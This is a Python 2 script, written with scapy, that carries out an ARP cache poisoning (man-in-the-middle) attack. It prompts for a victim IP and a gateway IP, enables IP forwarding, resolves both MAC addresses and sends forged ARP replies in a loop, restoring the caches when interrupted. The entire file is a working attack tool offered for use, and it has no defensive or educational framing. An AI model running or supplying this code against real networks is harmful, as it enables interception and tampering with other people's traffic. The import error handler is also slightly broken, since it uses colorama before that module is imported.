#!/etc/bin/python


import sys
import os
import time

try:    
    #Module for Packet Manipulation
    from scapy.all import *
except ImportError:
    print Fore.RED + Style.BRIGHT + "\n### Module Scapy needs to be installed on your system. ###\n"
    print Fore.BLUE + Style.BRIGHT + "### Download it from: https://pypi.org/project/scapy/ ###\n"
    print Fore.BLUE + Style.BRIGHT + "### Or just install it via pip: 'pip install scapy' ###\n"
    sys.exit()

try:    
    #Module for output coloring
    from colorama import init, deinit, Fore, Style

except ImportError:
    print "\n### Module colorama needs to be installed on your system. ###\n"
    print "### Download it from: https://pypi.org/project/colorama/ ###\n"
    print "### Or just install it via pip: 'pip install colorama' ###\n"
    sys.exit()


	

#This fuction starts the attack with sending malicious MAC and IP addresses!
#gMAC(Gateway MAC), vMAC(Victim MAC), gIP(Gateway IP), vIP(Victim IP)
try:
    def start(gMAC, vMAC, gIP, vIP):
        send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst = vMAC), verbose = 0)
        send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = gMAC), verbose = 0)
    
    # Stops what it has done and Make everything as it was!
    def stop(gMAC, vMAC, gIP, vIP):
        send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = vMAC), count = 5)
        send(ARP(op = 2, pdst = vIP, psrc = gIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gMAC), count = 5)
    
    def attack():
        try:
            print Fore.BLUE + Style.BRIGHT + "\n### Poisoning . . . . "
            while True:
                start(gatewayMAC,victimMAC,gatewayIP,victimIP)
                time.sleep(5)
        except KeyboardInterrupt:
            print Fore.BLUE + Style.BRIGHT + "\n### Stopping the Attack and ARP Cache is Restoring . . . . ."
            stop(gatewayMAC,victimMAC,gatewayIP,victimIP)
            print Fore.BLUE + Style.BRIGHT + "\n### Exiting . . . . . "
            print(Style.RESET_ALL)
            sys.exit(1)
    
    interface = raw_input(Fore.BLUE + Style.BRIGHT + "\n### Please Specify Your Network Interface, like (eth0):  ")
    victimIP = raw_input(Fore.BLUE + Style.BRIGHT + "\n### Enter Victim IP:  ")
    gatewayIP = raw_input(Fore.BLUE + Style.BRIGHT + "\n### Enter Gateway IP:  ")
    
    print Fore.CYAN  + Style.BRIGHT + "\n### Enabling IP Forwarding . . . \n"
    
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    try:
            victimAns, victimUnans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = victimIP), timeout = 2, iface = interface, inter = 0.1)
            victimMAC = victimAns[0][1].hwsrc
            gatewayAns, gatewayUnans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = gatewayIP), timeout = 2, iface = interface, inter = 0.1)
            gatewayMAC = gatewayAns[0][1].hwsrc
            print Fore.BLUE + Style.BRIGHT + "\n### Gateway MAC Address Resolved: %s  ###" %(gatewayMAC)
            print Fore.BLUE + Style.BRIGHT + "\n### Victim MAC Address Resolved: %s  ###" %(victimMAC)
    except Exception:
            print Fore.BLUE + Style.BRIGHT + "\n### Was unable to locate MAC address for given victim/gateway ###"
            print Fore.BLUE + Style.BRIGHT + "\n### Exiting . . ."
            print(Style.RESET_ALL)
            sys.exit(1)
except KeyboardInterrupt:
    print Fore.RED + Style.BRIGHT + "\n\n### Program canceled by user. Exiting ...\n\n"
    print(Style.RESET_ALL)

    sys.exit()

attack()







		